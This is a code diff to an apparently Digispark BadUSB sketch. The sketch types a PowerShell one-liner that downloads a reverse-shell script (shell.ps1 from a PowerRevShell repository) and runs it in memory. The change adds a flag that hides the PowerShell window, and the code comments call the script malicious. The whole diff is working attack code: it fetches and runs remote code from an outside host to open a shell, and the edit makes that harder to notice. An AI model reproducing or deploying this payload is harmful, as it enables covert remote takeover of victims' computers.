@@ -30,8 +30,8 @@ void loop()
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(500);
     
-    // expression declares a WebClient object to download our malicious script and execute it via powershell in memory
-    DigiKeyboard.print("echo IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/andsko92/PowerRevShell/master/shell.ps1') | powershell -noprofile");
+    // expression declares a WebClient object to download our malicious script and execute it via powershell in memory. It also hides powershell window.
+    DigiKeyboard.print("echo IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/andsko92/PowerRevShell/master/shell.ps1') | powershell -noprofile -W Hidden");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(500);    
 
